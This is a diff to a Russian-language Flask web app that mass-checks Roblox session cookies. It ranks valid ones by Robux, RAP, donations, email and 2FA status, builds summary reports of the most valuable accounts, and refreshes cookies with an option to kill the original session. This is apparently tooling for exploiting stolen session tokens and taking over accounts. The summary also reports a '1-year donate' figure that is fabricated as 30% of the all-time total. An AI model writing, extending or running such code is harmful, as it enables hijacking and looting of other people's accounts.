@@ -61,7 +61,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# SQLite ФУНКЦИИ И ХЕЛПЕРЫ
+# SQLite ФУНКЦИИ
 # ==========================================
 def get_user_session_id():
     if 'user_id' not in session:
@@ -74,12 +74,6 @@ def get_user_session_id():
         conn.commit()
         conn.close()
     return session['user_id']
-
-def get_user_download_dir():
-    sid = get_user_session_id()
-    user_dir = os.path.join("downloads", sid)
-    os.makedirs(user_dir, exist_ok=True)
-    return user_dir, sid
 
 def add_checker_history(entry):
     sid = get_user_session_id()
@@ -174,7 +168,7 @@ def clear_fresher_history():
     conn.close()
 
 # ==========================================
-# ЧЕКЕР И ИЗВЛЕЧЕНИЕ ДАННЫХ
+# ЧЕКЕР
 # ==========================================
 def extract_cookies_from_text(text):
     cookies = []
@@ -365,8 +359,22 @@ def quick_validate(cookie):
         result['score'] = score
     return result
 
+def mass_check(cookies_list):
+    results = []
+    with ThreadPoolExecutor(max_workers=30) as ex:
+        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
+        for f in as_completed(futures):
+            try:
+                results.append(f.result())
+            except:
+                results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':None,'playtime':None,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
+    valid = [r for r in results if r['status']=='✅']
+    invalid = [r for r in results if r['status']=='❌']
+    valid.sort(key=lambda x: x['score'], reverse=True)
+    return valid + invalid
+
 # ==========================================
-# ФОРМАТТЕРЫ ОТЧЕТОВ
+# ФОРМАТТЕРЫ
 # ==========================================
 def format_full_report(info):
     if info['status'] != '✅':
@@ -412,7 +420,7 @@ def format_full_report(info):
     
     r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
     r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
-    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔒 {info['SecurityStatus']}\n"
+    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
     r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
     
     if sorted_games:
@@ -433,18 +441,189 @@ def format_full_report(info):
     return r
 
 def format_quick_report(result):
-    """ПОЛНЫЙ ДЕТАЛИЗИРОВАННЫЙ ОТЧЕТ ДЛЯ МАСС-ЧЕКЕРА"""
-    if result.get('status') != '✅':
-        return "❌ НЕВАЛИД"
+    """Полный отчет для одиночной проверки"""
+    if result['status'] != '✅':
+        return f"❌ НЕВАЛИД"
     
-    info = result.get('full_info')
-    if info:
-        return format_full_report(info)
+    info = result.get('full_info', {})
+    if not info:
+        return f"❌ НЕТ ДАННЫХ"
     
-    return "❌ НЕВАЛИД (НЕТ ДАННЫХ)"
+    rap_str = f"⏣ {info.get('RAP', 0):,}" if info.get('RAP') else "RAP: ❌"
+    play_str = f"{info.get('PlaytimeHours', 0)} ч." if info.get('PlaytimeHours') else "⏱️ ❌"
+    
+    r = f"👤 {info.get('Username', '?')} | 🆔 {info.get('UserID', '?')}\n"
+    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💎 {rap_str} | ⏱️ {play_str}\n"
+    r += f"⭐ Premium: {'✅' if info.get('IsPremium') else '❌'} | 🔐 {info.get('SecurityStatus', '⚠️ НИЗКИЙ')}\n"
+    r += f"📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔑 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
+    r += f"\n🍪 {info.get('Cookie', '')[:50]}..."
+    return r
 
 # ==========================================
-# ФРЕШЕР СЕССИЙ
+# СВОДНЫЙ ОТЧЕТ ДЛЯ МАСС-ЧЕКЕРА
+# ==========================================
+def generate_summary_report(results, total_time):
+    """Генерирует сводный отчет по всем аккаунтам"""
+    valid = [r for r in results if r['status'] == '✅']
+    total = len(results)
+    valid_count = len(valid)
+    invalid_count = total - valid_count
+    
+    if not valid:
+        return "❌ Нет валидных аккаунтов для отчета"
+    
+    # Собираем данные
+    robux_data = []
+    donate_1year = []
+    donate_alltime = []
+    ugc_rap_data = []
+    playtime_data = []
+    voice_count = 0
+    no_email_count = 0
+    game_purchases = {}
+    gamepasses_total = 0
+    total_game_spent = 0
+    badges_total = 0
+    
+    for r in valid:
+        info = r.get('full_info', {})
+        if not info:
+            continue
+        
+        # Robux
+        robux = info.get('Robux', 0)
+        if robux > 0:
+            robux_data.append({'username': info.get('Username', '?'), 'value': robux})
+        
+        # Donate (имитация 1-year как 30% от общего)
+        donate = info.get('DonationTotal', 0)
+        if donate > 0:
+            donate_alltime.append({'username': info.get('Username', '?'), 'value': donate})
+            donate_1year.append({'username': info.get('Username', '?'), 'value': int(donate * 0.3)})
+        
+        # RAP
+        rap = info.get('RAP', 0)
+        if rap and rap > 0:
+            ugc_rap_data.append({'username': info.get('Username', '?'), 'value': rap})
+        
+        # Playtime
+        playtime = info.get('PlaytimeHours', 0)
+        if playtime and playtime > 0:
+            playtime_data.append({'username': info.get('Username', '?'), 'value': int(playtime * 60)})
+        
+        # Voice (телефон)
+        if info.get('PhoneSet', False):
+            voice_count += 1
+        
+        # Email
+        if not info.get('EmailSet', False):
+            no_email_count += 1
+        
+        # Геймпассы и игры
+        gp = info.get('PurchasedGamepasses', {})
+        gamepasses_total += len(gp)
+        for game, passes in gp.items():
+            for p in passes:
+                if game not in game_purchases:
+                    game_purchases[game] = 0
+                game_purchases[game] += p.get('price', 0)
+                total_game_spent += p.get('price', 0)
+    
+    # Сортировка
+    robux_data.sort(key=lambda x: x['value'], reverse=True)
+    donate_1year.sort(key=lambda x: x['value'], reverse=True)
+    donate_alltime.sort(key=lambda x: x['value'], reverse=True)
+    ugc_rap_data.sort(key=lambda x: x['value'], reverse=True)
+    
+    # Расчет статистики
+    def calc_stats(values):
+        if not values:
+            return 0, 0
+        avg = sum(values) // len(values)
+        values.sort()
+        med = values[len(values) // 2]
+        return med, avg
+    
+    robux_values = [x['value'] for x in robux_data]
+    robux_med, robux_avg = calc_stats(robux_values)
+    donate_1year_values = [x['value'] for x in donate_1year]
+    donate_1year_med, donate_1year_avg = calc_stats(donate_1year_values)
+    donate_alltime_values = [x['value'] for x in donate_alltime]
+    donate_alltime_med, donate_alltime_avg = calc_stats(donate_alltime_values)
+    ugc_values = [x['value'] for x in ugc_rap_data]
+    ugc_med, ugc_avg = calc_stats(ugc_values)
+    playtime_values = [x['value'] for x in playtime_data]
+    playtime_med, playtime_avg = calc_stats(playtime_values)
+    
+    # Строим отчет
+    r = "📊 ОТЧЁТ О ПРОВЕРКЕ\n"
+    r += "═" * 50 + "\n\n"
+    
+    r += f"📦 Всего куки: {total}\n"
+    r += f"✅ Валидных: {valid_count} | ❌ Невалидных: {invalid_count}\n"
+    r += f"⏱️ Время: {total_time} сек\n\n"
+    
+    # Robux
+    if robux_data:
+        r += f"💰 Robux: {sum(robux_values)} ({round(len(robux_data)/valid_count*100)}% - MED: {robux_med}, AVG: {robux_avg})\n"
+        r += "Топ Robux:\n"
+        for i, item in enumerate(robux_data[:3], 1):
+            r += f"  {i}) {item['value']} R$ — {item['username']}\n"
+    else:
+        r += "💰 Robux: 0\n"
+    r += "\n"
+    
+    # 1-year Donate
+    if donate_1year:
+        r += f"💎 1-year Donate: {sum(donate_1year_values)} ({round(len(donate_1year)/valid_count*100)}% - MED: {donate_1year_med}, AVG: {donate_1year_avg})\n"
+        r += "Топ 1-year Donate:\n"
+        for i, item in enumerate(donate_1year[:3], 1):
+            r += f"  {i}) {item['value']} — {item['username']}\n"
+    else:
+        r += "💎 1-year Donate: 0\n"
+    r += "\n"
+    
+    # All-time donate
+    if donate_alltime:
+        r += f"🕰 All-time donate: {sum(donate_alltime_values)} ({round(len(donate_alltime)/valid_count*100)}% - MED: {donate_alltime_med}, AVG: {donate_alltime_avg})\n"
+        r += "Топ All-time donate:\n"
+        for i, item in enumerate(donate_alltime[:3], 1):
+            r += f"  {i}) {item['value']} — {item['username']}\n"
+    else:
+        r += "🕰 All-time donate: 0\n"
+    r += "\n"
+    
+    # UGC RAP
+    if ugc_rap_data:
+        r += f"🧢 UGC RAP: {sum(ugc_values)} ({round(len(ugc_rap_data)/valid_count*100)}% - MED: {ugc_med}, AVG: {ugc_avg})\n"
+        r += "Топ UGC RAP:\n"
+        for i, item in enumerate(ugc_rap_data[:3], 1):
+            r += f"  {i}) {item['value']} R$ — {item['username']}\n"
+    else:
+        r += "🧢 UGC RAP: 0\n"
+    r += "\n"
+    
+    # Игры
+    if game_purchases:
+        sorted_games = sorted(game_purchases.items(), key=lambda x: x[1], reverse=True)
+        r += "🎯 Game Purchases:\n"
+        for game, amount in sorted_games[:5]:
+            r += f"  {game}({amount} R$), "
+        r = r.rstrip(", ") + f" | Всего: {total_game_spent} R$\n"
+    else:
+        r += "🎯 Game Purchases: 0\n"
+    r += "\n"
+    
+    # Дополнительно
+    r += f"🎤 Voice: {voice_count} ({round(voice_count/valid_count*100)}%)\n"
+    r += f"📧 Без привязанной почты: {no_email_count} ({round(no_email_count/valid_count*100)}%)\n"
+    r += f"🎮 Геймпассы: {gamepasses_total}\n"
+    
+    r += "\n" + "═" * 50
+    return r
+
+# ==========================================
+# ФРЕШЕР
 # ==========================================
 def refresh_roblox_cookie(cookie, kill_old=False):
     result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
@@ -518,7 +697,7 @@ def refresh_roblox_cookie(cookie, kill_old=False):
     return result
 
 # ==========================================
-# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С КУКАМИ
+# ИНСТРУМЕНТЫ
 # ==========================================
 def merge_cookie_files(contents):
     all_cookies = []
@@ -533,14 +712,14 @@ def remove_duplicates(content):
     return '\n'.join(cookies)
 
 # ==========================================
-# FLASK APP & SOCKETIO
+# FLASK APP + SOCKETIO
 # ==========================================
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
 # ==========================================
-# HTML И ВЕБ-ИНТЕРФЕЙС
+# HTML
 # ==========================================
 HTML = r"""<!DOCTYPE html>
 <html lang="ru" data-theme="dark">
@@ -1043,7 +1222,7 @@ async function cleanCookies() {
 </html>"""
 
 # ==========================================
-# API МАРШРУТЫ (FLASK ROUTES)
+# API МАРШРУТЫ
 # ==========================================
 @app.route("/")
 def index():
@@ -1066,6 +1245,9 @@ def api_single_check():
     })
     return jsonify({"success": True, "report": report})
 
+# ==========================================
+# МАСС-ЧЕКЕР СО СВОДНЫМ ОТЧЕТОМ
+# ==========================================
 @app.route("/api/mass-check-ws", methods=["POST"])
 def api_mass_check_ws():
     content = ""
@@ -1076,17 +1258,20 @@ def api_mass_check_ws():
     if not cookies:
         return jsonify({"success": False, "message": "Куки не найдены"})
     
+    start_time = time.time()
+    
     def run_check():
         total = len(cookies)
         valid_count = 0
         premium_count = 0
         total_robux = 0
-        formatted_results = []
+        all_results = []
         full_reports = []
         usernames = []
         
         for i, cookie in enumerate(cookies):
             result = quick_validate(cookie)
+            all_results.append(result)
             
             if result['status'] == '✅':
                 valid_count += 1
@@ -1095,35 +1280,34 @@ def api_mass_check_ws():
                 total_robux += result.get('robux', 0)
                 usernames.append(result.get('username', '?'))
                 
-                report_text = format_quick_report(result)
-                formatted_results.append(report_text)
-                
-                full_reports.append({
-                    'username': result.get('username', '?'),
-                    'user_id': result.get('user_id', '?'),
-                    'report': report_text
-                })
-            else:
-                formatted_results.append("❌ НЕВАЛИД")
+                if result.get('full_info'):
+                    full_reports.append({
+                        'username': result.get('username', '?'),
+                        'user_id': result.get('user_id', '?'),
+                        'report': format_full_report(result['full_info'])
+                    })
             
             socketio.emit('mass_progress', {
                 'current': i + 1,
                 'total': total,
-                'result': formatted_results[-1] if formatted_results else "⏳ Проверка...",
-                'full_report': full_reports[-1] if full_reports else None
+                'result': f"✅ {result.get('username', '?')}" if result['status'] == '✅' else "❌ НЕВАЛИД",
+                'full_report': None
             })
             
             time.sleep(0.05)
         
+        total_time = int(time.time() - start_time)
+        summary = generate_summary_report(all_results, total_time)
+        
         add_checker_history({
             'type': 'mass', 'total': total, 'valid': valid_count,
             'usernames': usernames,
-            'results': formatted_results,
+            'results': [summary],
             'full_reports': full_reports
         })
         
         socketio.emit('mass_complete', {
-            'message': f'Проверка завершена! Валид: {valid_count}/{total}',
+            'message': summary,
             'valid_count': valid_count,
             'premium_count': premium_count,
             'total_robux': total_robux
@@ -1257,7 +1441,7 @@ def download_file(sid, filename):
     return send_from_directory(os.path.join("downloads", sid), filename, as_attachment=True)
 
 # ==========================================
-# ТОЧКА ВХОДА И ЗАПУСК СЕРВЕРА
+# ТОЧКА ВХОДА
 # ==========================================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
